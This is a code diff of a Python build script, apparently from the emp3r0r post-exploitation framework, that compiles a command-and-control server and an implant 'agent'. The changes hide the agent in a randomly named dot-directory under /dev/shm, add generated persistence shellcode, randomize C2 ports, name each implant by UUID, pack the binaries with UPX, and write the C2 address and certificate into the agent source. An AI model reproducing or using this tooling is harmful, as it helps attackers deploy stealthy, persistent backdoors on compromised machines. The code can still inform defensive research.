@@ -6,9 +6,14 @@
 this script replaces build.sh, coz bash/sed/awk is driving me insane
 '''
 
+import atexit
 import glob
+import json
 import os
+import random
+import readline
 import shutil
+import subprocess
 import sys
 import traceback
 import uuid
@@ -39,11 +44,25 @@ class GoBuild:
         self.CC_OTHER_NAMES = cc_other_names
         self.INDICATOR = cc_indicator
         self.UUID = str(uuid.uuid1())
+        self.VERSION = get_version()
+
+        # agent root directory
+
+        if "agent_root" in CACHED_CONF:
+            self.AgentRoot = CACHED_CONF['agent_root']
+        else:
+            self.AgentRoot = f"/dev/shm/.{rand_str(random.randint(3, 9))}"
+            CACHED_CONF['agent_root'] = self.AgentRoot
 
     def build(self):
         '''
         cd to cmd and run go build
         '''
+        # write cache
+        json_file = open(BUILD_JSON, "w+")
+        json.dump(CACHED_CONF, json_file)
+        json_file.close()
+
         self.gen_certs()
         # CA
         f = open("./tls/rootCA.crt")
@@ -64,18 +83,21 @@ class GoBuild:
             return
 
         log_warn("GO BUILD starts...")
+        build_target = f"../../build/{self.target}"
+        if self.target == "agent":
+            build_target = f"../../build/{self.target}-{self.UUID}"
         # cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH}''' + \
         # f''' go build -ldflags='-s -w -extldflags "-static"' -o ../../build/{self.target}'''
         cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0''' + \
-            f''' go build -ldflags='-s -w' -o ../../build/{self.target}'''
+            f''' go build -ldflags='-s -w' -o {build_target}'''
         os.system(cmd)
         log_warn("GO BUILD ends...")
 
         os.chdir("../../")
         self.unset_tags()
 
-        if os.path.exists(f"./build/{self.target}"):
-            os.system(f"upx -9 ./build/{self.target}")
+        if os.path.exists(f"./build/{build_target.split('/')[-1]}"):
+            os.system(f"upx -9 ./build/{build_target.split('/')[-1]}")
         else:
             log_error("go build failed")
             sys.exit(1)
@@ -85,15 +107,9 @@ class GoBuild:
         generate server cert/key, and CA if necessary
         '''
 
-        if os.path.exists("./build/ccip.txt"):
-            f = open("./build/ccip.txt")
-
-            if self.CCIP == f.read() and os.path.exists("./build/emp3r0r-key.pem"):
-                f.close()
-
+        if "ccip" in CACHED_CONF:
+            if self.CCIP == CACHED_CONF['ccip'] and os.path.exists("./build/emp3r0r-key.pem"):
                 return
-
-            f.close()
 
         log_warn("[!] Generating new certs...")
         try:
@@ -111,33 +127,66 @@ class GoBuild:
     def unset_tags(self):
         '''
         restore tags in the source
-
-        - CA: emp3r0r CA, ./internal/tun/tls.go
-        - CC indicator: check if CC is online, ./internal/agent/def.go
-        - Agent ID: UUID (tag) of our agent, ./internal/agent/def.go
-        - CC IP: IP of CC server, ./internal/agent/def.go
         '''
 
+        # version
+        sed("./internal/agent/def.go",
+            f"Version = \"{self.VERSION}\"", "Version = \"[emp3r0r_version_string]\"")
+        # agent root path
+        sed("./internal/agent/def.go",
+            self.AgentRoot, "[agent_root]")
+        # CA
         sed("./internal/tun/tls.go", self.CA, "[emp3r0r_ca]")
+        if self.target == "agent":
+            # guardian_shellcode
+            sed("./internal/agent/def.go", f"GuardianShellcode = `{CACHED_CONF['guardian_shellcode']}`",
+                "GuardianShellcode = `[persistence_shellcode]`")
+            sed("./internal/agent/def.go", f"GuardianAgentPath = \"{CACHED_CONF['guardian_agent_path']}\"",
+                "GuardianAgentPath = \"[persistence_agent_path]\"")
+        # cc indicator
         sed("./internal/agent/def.go", self.INDICATOR, "[cc_indicator]")
         # in case we use the same IP for indicator and CC
         sed("./internal/agent/def.go", self.CCIP, "[cc_ipaddr]")
         sed("./internal/agent/def.go", self.UUID, "[agent_uuid]")
+        # restore ports
+        sed("./internal/agent/def.go",
+            f"CCPort = \"{CACHED_CONF['cc_port']}\"", "CCPort = \"[cc_port]\"")
+        sed("./internal/agent/def.go",
+            f"ProxyPort = \"{CACHED_CONF['proxy_port']}\"", "ProxyPort = \"[proxy_port]\"")
+        sed("./internal/agent/def.go",
+            f"BroadcastPort = \"{CACHED_CONF['broadcast_port']}\"", "BroadcastPort = \"[broadcast_port]\"")
 
     def set_tags(self):
         '''
         modify some tags in the source
-
-        - CA: emp3r0r CA, ./internal/tun/tls.go
-        - CC indicator: check if CC is online, ./internal/agent/def.go
-        - Agent ID: UUID (tag) of our agent, ./internal/agent/def.go
-        - CC IP: IP of CC server, ./internal/agent/def.go
         '''
 
+        # version
+        sed("./internal/agent/def.go",
+            "Version = \"[emp3r0r_version_string]\"", f"Version = \"{self.VERSION}\"")
+        if self.target == "agent":
+            # guardian shellcode
+            sed("./internal/agent/def.go",
+                "[persistence_shellcode]", CACHED_CONF['guardian_shellcode'])
+            sed("./internal/agent/def.go",
+                "[persistence_agent_path]", CACHED_CONF['guardian_agent_path'])
+        # CA
         sed("./internal/tun/tls.go", "[emp3r0r_ca]", self.CA)
+        # CC IP
         sed("./internal/agent/def.go", "[cc_ipaddr]", self.CCIP)
+        # agent root path
+        sed("./internal/agent/def.go", "[agent_root]", self.AgentRoot)
+        # indicator
         sed("./internal/agent/def.go", "[cc_indicator]", self.INDICATOR)
+        # agent UUID
         sed("./internal/agent/def.go", "[agent_uuid]", self.UUID)
+        # ports
+        sed("./internal/agent/def.go",
+            "[cc_port]", CACHED_CONF['cc_port'])
+        sed("./internal/agent/def.go",
+            "[proxy_port]", CACHED_CONF['proxy_port'])
+        sed("./internal/agent/def.go",
+            "[broadcast_port]", CACHED_CONF['broadcast_port'])
 
 
 def clean():
@@ -149,10 +198,15 @@ def clean():
 
     for f in to_rm:
         try:
-            os.remove(f)
+            # remove directories too
+
+            if os.path.isdir(f):
+                os.removedirs(f)
+            else:
+                os.remove(f)
             print(" Deleted "+f)
         except BaseException:
-            traceback.print_exc()
+            log_error(traceback.format_exc)
 
 
 def sed(path, old, new):
@@ -173,12 +227,32 @@ def yes_no(prompt):
     '''
     y/n?
     '''
+
+    if yes_to_all:
+        log_warn(f"Choosing 'yes' for '{prompt}'")
+
+        return True
+
     answ = input(prompt + " [Y/n] ").lower().strip()
 
     if answ in ["n", "no", "nah", "nay"]:
         return False
 
     return True
+
+
+def rand_str(length):
+    '''
+    random string
+    '''
+    uuidstr = str(uuid.uuid4()).replace('-', '')
+
+    # we don't want the string to be long
+
+    if length >= len(uuidstr):
+        return uuidstr
+
+    return uuidstr[:length]
 
 
 def main(target):
@@ -196,22 +270,19 @@ def main(target):
 
     # cc IP
 
-    if os.path.exists("./build/ccip.txt"):
-        f = open("./build/ccip.txt")
-        ccip = f.read().strip()
-        f.close()
+    if "ccip" in CACHED_CONF:
+        ccip = CACHED_CONF['ccip']
         use_cached = yes_no(f"Use cached CC address ({ccip})?")
 
     if not use_cached:
         if yes_no("Clean everything and start over?"):
             clean()
         ccip = input("CC server address (domain name or ip address): ").strip()
-        f = open("./build/ccip.txt", "w+")
-        f.write(ccip)
-        f.close()
+        CACHED_CONF['ccip'] = ccip
 
     if target == "cc":
         cc_other = ""
+
         if not os.path.exists("./build/emp3r0r-key.pem"):
             cc_other = input(
                 "Additional CC server addresses (separate with space): ").strip()
@@ -229,17 +300,28 @@ def main(target):
 
     use_cached = False
 
-    if os.path.exists("./build/indicator.txt"):
-        f = open("./build/indicator.txt")
-        indicator = f.read().strip()
-        f.close()
+    if "cc_indicator" in CACHED_CONF:
+        indicator = CACHED_CONF['cc_indicator']
         use_cached = yes_no(f"Use cached CC indicator ({indicator})?")
 
     if not use_cached:
         indicator = input("CC status indicator: ").strip()
-        f = open("./build/indicator.txt", "w+")
-        f.write(indicator)
-        f.close()
+        CACHED_CONF['cc_indicator'] = indicator
+
+    # guardian shellcode
+
+    use_cached = False
+
+    if "guardian_shellcode" in CACHED_CONF and "guardian_agent_path" in CACHED_CONF:
+        guardian_shellcode = CACHED_CONF['guardian_shellcode']
+        guardian_agent_path = CACHED_CONF['guardian_agent_path']
+        use_cached = yes_no(
+            f"Use cached {len(guardian_shellcode)} bytes of guardian shellcode ({guardian_agent_path})?")
+
+    if not use_cached:
+        path = input("Agent path for guardian shellcode: ").strip()
+        CACHED_CONF['guardian_shellcode'] = gen_guardian_shellcode(path)
+        CACHED_CONF['guardian_agent_path'] = path
 
     gobuild = GoBuild(target="agent", cc_indicator=indicator, cc_ip=ccip)
     gobuild.build()
@@ -254,17 +336,136 @@ def log_error(msg):
 
 def log_warn(msg):
     '''
-    print in red
+    print in yellow
     '''
     print("\u001b[33m"+msg+"\u001b[0m")
 
 
-if len(sys.argv) != 2:
-    print(f"python3 {sys.argv[0]} [cc/agent]")
+def save(prev_h_len, hfile):
+    '''
+    append to histfile
+    '''
+    new_h_len = readline.get_current_history_length()
+    readline.set_history_length(1000)
+    readline.append_history_file(new_h_len - prev_h_len, hfile)
+
+
+# JSON config file, cache some user data
+BUILD_JSON = "./build/build.json"
+CACHED_CONF = {}
+
+if os.path.exists(BUILD_JSON):
+    try:
+        jsonf = open(BUILD_JSON)
+        CACHED_CONF = json.load(jsonf)
+        jsonf.close()
+    except BaseException:
+        log_warn(traceback.format_exc())
+
+
+def rand_port():
+    '''
+    returns a random int between 1024 and 65535
+    '''
+
+    return str(random.randint(1025, 65534))
+
+
+def randomize_ports():
+    '''
+    randomize every port used by emp3r0r agent,
+    cache them in build.json
+    '''
+
+    if 'cc_port' not in CACHED_CONF:
+        CACHED_CONF['cc_port'] = rand_port()
+
+    if 'proxy_port' not in CACHED_CONF:
+        CACHED_CONF['proxy_port'] = rand_port()
+
+    if 'broadcast_port' not in CACHED_CONF:
+        CACHED_CONF['broadcast_port'] = rand_port()
+
+
+def gen_guardian_shellcode(path):
+    '''
+    ../shellcode/gen.py
+    '''
+    try:
+        pwd = os.getcwd()
+        os.chdir("../shellcode")
+        out = subprocess.check_output(["python3", "gen.py", path])
+        os.chdir(pwd)
+
+        shellcode = out.decode('utf-8')
+
+        if "Failed" in shellcode:
+            log_error("Failed to generate shellcode: "+out)
+
+            return "N/A"
+    except BaseException:
+        log_error(traceback.format_exc())
+
+        return "N/A"
+
+    return shellcode
+
+
+def get_version():
+    '''
+    print current version
+    '''
+    try:
+        check = "git describe --tags"
+        out = subprocess.check_output(
+            ["/bin/sh", "-c", check],
+            stderr=subprocess.STDOUT, timeout=3)
+    except KeyboardInterrupt:
+        return "Unknown"
+    except BaseException:
+        check = "git describe --always"
+        try:
+            out = subprocess.check_output(
+                ["/bin/sh", "-c", check],
+                stderr=subprocess.STDOUT, timeout=3)
+        except BaseException:
+            try:
+                versionf = open(".version")
+                version = versionf.read().strip()
+                versionf.close()
+                return version
+            except BaseException:
+                return "Unknown"
+
+    return out.decode("utf-8").strip()
+
+
+# command line args
+yes_to_all = False
+
+if len(sys.argv) < 2:
+    print(f"python3 {sys.argv[0]} cc/agent [-y]")
     sys.exit(1)
+elif len(sys.argv) == 3:
+    # if `-y` is specified, no questions will be asked
+    yes_to_all = sys.argv[2] == "-y"
+
 try:
+    randomize_ports()
+
     if not os.path.exists("./build"):
         os.mkdir("./build")
+
+    # support GNU readline interface, command history
+    histfile = "./build/.build_py_history"
+    try:
+        readline.read_history_file(histfile)
+        h_len = readline.get_current_history_length()
+    except FileNotFoundError:
+        open(histfile, 'wb').close()
+        h_len = 0
+    atexit.register(save, h_len, histfile)
+
     main(sys.argv[1])
 except (KeyboardInterrupt, EOFError, SystemExit):
     sys.exit(0)
